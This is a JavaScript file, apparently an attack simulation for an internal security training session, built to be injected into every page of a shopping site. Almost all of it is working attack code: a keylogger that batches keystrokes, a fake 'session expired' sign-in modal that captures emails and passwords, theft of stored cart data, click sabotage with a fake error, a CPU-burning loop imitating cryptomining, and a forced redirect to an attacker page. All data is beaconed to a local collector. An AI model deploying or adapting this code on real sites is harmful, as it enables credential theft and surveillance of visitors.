/*
 * 【社内セキュリティ勉強会用・意図的な攻撃状態 — 所有者承認済み】
 * beauty_split_2 全ページに組み込む攻撃シミュレーション。
 *
 * 実行タイムライン（ページ表示からの経過時間）:
 *   8秒   偽「再サインイン」モーダル（入力された認証情報を収集サーバへ送信）
 *   20秒  クリック妨害（3回に1回のクリックを握りつぶす）+ 偽アプリケーションエラー
 *         （表示中の1回限りの「本当に」リロード。sessionStorage 'bsim.reloaded' でガード）
 *   30秒  CPU マイニング疑似（45秒間、実際に負荷をかけて fps を落とす）
 *   50秒  10秒カウントダウンののち、ローカル収集サーバの攻撃者ページへ強制リダイレクト
 *         （収集サーバが生きている場合のみ。訪問者環境では自動的にスキップされる）
 *
 * 常時: キーロガー（10キーまたは5秒でバッチ送信）、lumiere_cart の読み取りと送信、
 *       ページ上部の「攻撃下にある」バナー、ATTACK LOG パネル。
 *
 * 無効化: URL に ?attack=0 を付けると何も実行しない。
 * 停止:   バナーの「攻撃を終了する」ボタンで、今後走るはずの全段階（リダイレクト含む）を停止。
 * 送信先: http://127.0.0.1:9999 のみ。外部への通信は一切ない。
 */
(function () {
  if (new URLSearchParams(location.search).get('attack') === '0') return;

  var COLLECTOR = 'http://127.0.0.1:9999/collect';
  var ATTACKER_ORIGIN = 'http://127.0.0.1:9999';
  var ROOT_ID = 'bsim-root';
  var PHISHING_AT = 8000;
  var SABOTAGE_AT = 20000;
  var MINING_AT = 30000;
  var REDIRECT_AT = 50000;
  var MINING_MS = 45000;
  var REDIRECT_COUNTDOWN = 10;

  var beacon = function (data, via) {
    new Image().src = COLLECTOR + '?d=' + encodeURIComponent(data) + '&src=' + encodeURIComponent(via);
  };
  var log = function (msg) {
    var el = document.getElementById('bsim-log');
    if (!el) return;
    var li = document.createElement('div');
    li.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
    el.insertBefore(li, el.firstChild);
  };

  var banner = document.createElement('div');
  banner.id = ROOT_ID;
  banner.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483000;background:#7a1010;color:#ffe9e9;font:600 12px/1.6 system-ui,sans-serif;padding:6px 14px;box-shadow:0 2px 8px rgba(0,0,0,.35)';
  banner.innerHTML = '<span>⚠ このサイトは攻撃下にあります（教育用デモ）— </span>' +
    '<button type="button" style="background:#ffe9e9;color:#7a1010;border:0;border-radius:4px;padding:2px 8px;font:inherit;cursor:pointer">攻撃を終了する</button>' +
    '<span id="bsim-count" style="display:none"></span>';
  document.body.appendChild(banner);

  var vignette = document.createElement('div');
  vignette.style.cssText = 'position:fixed;inset:0;pointer-events:none;z-index:2147482999;box-shadow:inset 0 0 120px rgba(90,0,0,.55)';
  document.body.appendChild(vignette);

  var attackLog = document.createElement('div');
  attackLog.id = 'bsim-logwrap';
  attackLog.style.cssText = 'position:fixed;bottom:0;left:0;z-index:2147483000;background:rgba(20,10,10,.92);color:#ffd9d9;font:11px/1.7 ui-monospace,monospace;padding:10px 14px;max-width:340px;border-top-right-radius:8px';
  attackLog.innerHTML = '<strong style="color:#ff9d9d">ATTACK LOG</strong><div id="bsim-log"></div>';
  document.body.appendChild(attackLog);

  var stopped = false;
  var stop = function () {
    if (stopped) return;
    stopped = true;
    banner.remove();
    vignette.remove();
    attackLog.remove();
    document.removeEventListener('keydown', onKey, true);
    document.removeEventListener('click', onDocClick, true);
  };
  banner.querySelector('button').addEventListener('click', stop);

  // キーロガー（10キーまたは5秒でバッチ送信）
  var keys = [];
  var flush = function () {
    if (!keys.length) return;
    beacon('KEYS ' + keys.join(''), 'beauty-keylog');
    keys = [];
  };
  var onKey = function (e) {
    if (stopped || e.key.length !== 1) return;
    keys.push(e.key);
    if (keys.length >= 10) flush();
  };
  document.addEventListener('keydown', onKey, true);
  setInterval(flush, 5000);

  // 保存データの読み取りと送信（このサイトのカート。書き換えはしない）
  try {
    var cart = localStorage.getItem('lumiere_cart');
    if (cart) beacon('CART ' + cart, 'beauty-cart-read');
  } catch (e) { /* 私人用モード等では読めないことがある */ }

  // 偽再サインイン（フィッシング）モーダル
  var showPhishing = function () {
    if (stopped) return;
    var w = document.createElement('div');
    w.style.cssText = 'position:fixed;inset:0;z-index:2147483001;background:rgba(0,0,0,.55);display:grid;place-items:center;font-family:system-ui,sans-serif';
    var box = document.createElement('div');
    box.style.cssText = 'background:#fff;border-radius:12px;padding:26px;width:min(360px,92vw);font-size:14px;color:#222';
    box.innerHTML = '<h3 style="margin:0 0 6px;font-size:17px">セッションの有効期限が切れています</h3>' +
      '<p style="margin:0 0 12px;color:#555;font-size:13px">続けるには、もう一度サインインしてください。</p>' +
      '<form>' +
      '<input name="id" placeholder="メールアドレス" autocomplete="off" required style="display:block;width:100%;box-sizing:border-box;padding:9px;margin:6px 0;border:1px solid #bbb;border-radius:6px">' +
      '<input name="pw" type="password" placeholder="パスワード" required style="display:block;width:100%;box-sizing:border-box;padding:9px;margin:6px 0;border:1px solid #bbb;border-radius:6px">' +
      '<button style="width:100%;padding:10px;background:#7a1010;color:#fff;border:0;border-radius:6px;font-weight:600;margin-top:8px">サインイン</button>' +
      '</form>' +
      '<small style="display:block;margin-top:10px;color:#999;font-size:10px">（教育用デモ。入力はローカルの収集サーバにのみ送信されます）</small>';
    w.appendChild(box);
    document.body.appendChild(w);
    w.querySelector('form').addEventListener('submit', function (ev) {
      ev.preventDefault();
      var g = function (n) { return ev.target.querySelector('[name=' + n + ']').value; };
      beacon('CREDS id=' + g('id') + ' pw=' + g('pw'), 'beauty-phish');
      w.remove();
      log('偽サインインで認証情報を収集');
    });
    log('フィッシング: 偽「再サインイン」を表示');
  };

  // クリック妨害（3回に1回。#bsim-root 内の操作は妨害しない）
  var clicks = 0;
  var onDocClick = function (e) {
    if (stopped) return;
    if (e.target.closest && e.target.closest('#' + ROOT_ID + ',#bsim-logwrap')) return;
    clicks++;
    if (clicks % 3 !== 0) return;
    e.stopPropagation();
    e.preventDefault();
    if (clicks === 3) {
      var err = document.createElement('div');
      err.style.cssText = 'position:fixed;inset:0;z-index:2147483001;background:rgba(0,0,0,.65);display:grid;place-items:center;font-family:system-ui,sans-serif';
      var inner = document.createElement('div');
      inner.style.cssText = 'background:#fff;border-radius:12px;padding:24px;width:min(380px,92vw);font-size:14px;color:#222;text-align:center';
      inner.innerHTML = '<strong>アプリケーションエラー</strong><p style="margin:8px 0 14px;color:#555;font-size:13px">問題が発生しました。ページを再読み込みします。</p>';
      var btn = document.createElement('button');
      btn.textContent = '再読み込み';
      btn.style.cssText = 'padding:9px 22px;background:#7a1010;color:#fff;border:0;border-radius:6px;font-weight:600;cursor:pointer';
      btn.addEventListener('click', function () {
        if (!sessionStorage.getItem('bsim.reloaded')) {
          sessionStorage.setItem('bsim.reloaded', '1');
          location.reload();
        } else {
          err.remove();
        }
      });
      inner.appendChild(btn);
      err.appendChild(inner);
      document.body.appendChild(err);
      log('クリック妨害 + 偽エラー（1回だけ本物のリロード）');
    }
  };
  document.addEventListener('click', onDocClick, true);

  // CPU マイニング疑似
  var startMining = function () {
    if (stopped) return;
    var deadline = Date.now() + MINING_MS;
    log('マイニング疑似を開始（45秒間・実際に負荷をかける）');
    (function loop() {
      if (stopped || Date.now() > deadline) { if (!stopped) log('マイニング疑似を終了'); return; }
      var end = Date.now() + 250;
      while (Date.now() < end) { /* busy loop */ }
      setTimeout(loop, 2000);
    })();
  };

  // 強制リダイレクト（収集サーバが生きているときだけ）
  var startRedirect = function () {
    if (stopped) return;
    var alive = false;
    var probe = new Image();
    probe.onload = function () { alive = true; };
    probe.src = ATTACKER_ORIGIN + '/owned?probe=' + Date.now();
    setTimeout(function () {
      if (stopped) return;
      if (!alive) { log('収集サーバなし → リダイレクトは省略'); return; }
      var left = REDIRECT_COUNTDOWN;
      var badge = banner.querySelector('#bsim-count');
      badge.style.display = 'inline';
      var tick = setInterval(function () {
        if (stopped) { clearInterval(tick); return; }
        badge.textContent = ' — ' + left + '秒後に攻撃者のページへ移動します';
        if (left-- <= 0) {
          clearInterval(tick);
          location.href = ATTACKER_ORIGIN + '/owned?from=beauty_split_2';
        }
      }, 1000);
      log('リダイレクトまでカウントダウン開始');
    }, 1500);
  };

  setTimeout(function () { if (!stopped) { showPhishing(); } }, PHISHING_AT);
  setTimeout(function () { if (!stopped) log('クリック妨害を有効化'); }, SABOTAGE_AT);
  setTimeout(startMining, MINING_AT);
  setTimeout(startRedirect, REDIRECT_AT);

  beacon('VISIT ' + location.pathname, 'beauty-visit');
  log('攻撃状態を開始（無効化: ?attack=0）');
})();
